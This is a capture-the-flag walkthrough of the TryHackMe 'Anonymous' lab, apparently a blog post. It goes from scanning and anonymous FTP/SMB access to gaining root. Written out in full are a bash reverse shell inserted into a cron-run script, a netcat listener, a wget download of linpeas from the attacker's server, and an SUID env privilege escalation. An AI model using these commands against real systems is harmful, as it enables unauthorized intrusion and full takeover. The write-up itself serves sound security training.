Anonymous is a medium difficulty box on [TryHackMe](https://www.tryhackme.com). Below is a walkthrough of the steps involved to achieve root on this box.

First, let's scan the box with nmap with **nmap -sC -sV -T4 [machine ip]**. The results of this scan are as shown below.

It appears that we have ftp (21) open with anonymous access allowed, ssh (22), and smb (139/445) open. 

This are a total of 4 open ports, the answer to **Question 1**. FTP is running on port 21, the answer to **Question 2**. Ports 139/445 are running smb, the answer to **Question 3**. 

Since we can see that ftp is open anonymously, let's login and take a look with **ftp [machine ip]**. When prompted for the username/password, use **anonymous** for both of them. Once logged in, we can run **ls** to list the directory contents.

Let's use **cd scripts** to get into the script directory and then type **ls** to list it's contents. Three files are present. Let's run **mget \*** to download these files to view them locally.

Let's use **bye** to close the ftp session and then take a look at these files. Let's start with **cat clean.sh**. This appears to be a script that removes everything in the /tmp directory and then logs it to **/var/ftp/scripts/removed_files.log**.

![Anonymous cat clean.sh](/assets/img/Anonymous4.png)

Next, let's take a look at removed_files.log with **cat removed_files.log**. It doesn't appear that there's anything useful in this, as it is the same log entry repeated several times.

The last file, which is viewed with **cat to_do.txt**, states that anonymous logins should be disabled because they aren't safe.

This is likely a hint that anonymous access is available in multiple places. Let's try to enumerate the smb shares next with **smbclient -L \\\\\\\\[machine ip]\\\\ **. This will return 3 shares as shown above.

The smb share **pics** is the answer to Question 4. Let's try to connect to pics anonymously with **smbclient \\\\\\\\[machine ip]\\\\pics -U ""**. We are also able to connect anonymously and after running **ls**, we see that there are 2 pictures in this folder. Let's grab them both with **mget \***.

Let's take a look at these two pictures. There's nothing suspicious on the pictures themselves, as they are just pictures of corgis. However, .jpg/.jpeg files can be used for steganography. Let's see if there's any hidden files inside. I ran stegcracker for a few minutes on both of these pictures and was not able to crack the password or confirm anything was hidden inside.

Let's go back to enumeration using rpcclient. Let's run **rpcclient [machine ip] -U ""**. Once connected, let's run **enumdomusers** to get the users on this victim host (namelessone) followed by **queryuser 0x3eb** and **getdompwinfo**.

While useful info, unless we wanted to spend a long time brute forcing the password, there had to be a simpler way to get in. At this point, I logged back in anonymously to the ftp server and noticed that we have read/write/execute on **clean.sh**. I wonder what would happen if we put in a reverse shell to run inside that script? On our local machine, let's open the **clean.sh** file that we downloaded earlier and modify it before we reupload it. Let's add in **bash -i >& /dev/tcp/[your attacker ip]/8080 0>&1** and save the file.

![Anonymous modify clean.sh](/assets/img/Anonymous10.png)

Next, in another terminal window on our attacker pc, run **nc -nvlp 8080** to open a listener on port 8080 that you specified in the clean.sh file above.

Next, let's reconnect with the anonymous ftp site, go into the scripts directory and upload our modified clean.sh file.

Now, we just wait for a connection, as that script appeared to be ran as a cron job. Within a couple of minutes, we now have a shell.

![Anonymous reverse shell](/assets/img/Anonymous13.png)

We are running as namelessone, and after running **pwd** we can see we are in that user's home directory. We can run **ls** and we will see the user.txt file in this directory. **cat user.txt** will get you the answer to **Question 5**.

![Anonymous user.txt](/assets/img/Anonymous14.png)

Let's upgrade our shell so we can run some other commands that require a TTY. Let's upgrade with **python -c 'import pty; pty.spawn("/bin/sh")'**. Attempting to run **sudo -l** requires a password, which we do not have for the user we currently have access to. Let's copy linpeas over to do some enumeration.

First, on our attacker pc, run **python3 -m http.server** in the directory that linepeas.sh is in. Next, on the victim, run **wget http://[attacker ip]:8000/linpeas.sh**, and it should save in namelessone's home directory. Next, run **chmod 777 linpeas.sh** to make the script executable.

![Anonymous wget linpeas.sh](/assets/img/Anonymous15.png)

Now lets run this with **./linpeas.sh**. While this puts out a lot of information, there is a SUID file that it notices, **/usr/bin/env**.

[GTFOBins](https://gtfobins.github.io/) is a great site to look up ways to exploit executables in Linux. env can be used for privilege escalation with **./env /bin/sh -p**. Now, if we run **whoami** we are the root user! We can now run **cd /root** followed by **ls**. root.txt is in this file, so let's run **cat root.txt** to get the root flag.
